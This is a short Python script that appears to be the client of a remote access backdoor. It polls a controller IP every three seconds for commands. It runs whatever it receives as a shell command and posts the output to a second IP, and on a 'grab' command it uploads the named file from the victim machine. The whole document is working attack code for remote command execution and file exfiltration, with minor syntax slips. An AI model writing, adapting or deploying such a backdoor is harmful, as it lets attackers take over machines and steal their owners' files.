
import requests 
import subprocess 
import os
import time


while True: 

    req = requests.get('http://111.111.11.11')
    command = req.text
        
    if 'terminate' in command:
        break 





    elif 'grab' in command:
        
        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable
        
        if os.path.exists(path): # check if the file is there
            
            filename = path.split('\')
            url = 'http://111.111.11.11/store?' + filename[-1] # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
            
        else:
            post_response = requests.post(url='http://52.66.95.129', data='[-] Not able to find the file !' )
            
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://52.66.95.129', data=CMD.stdout.read() )
        post_response = requests.post(url='http://52.66.95.129', data=CMD.stderr.read() )

    time.sleep(3)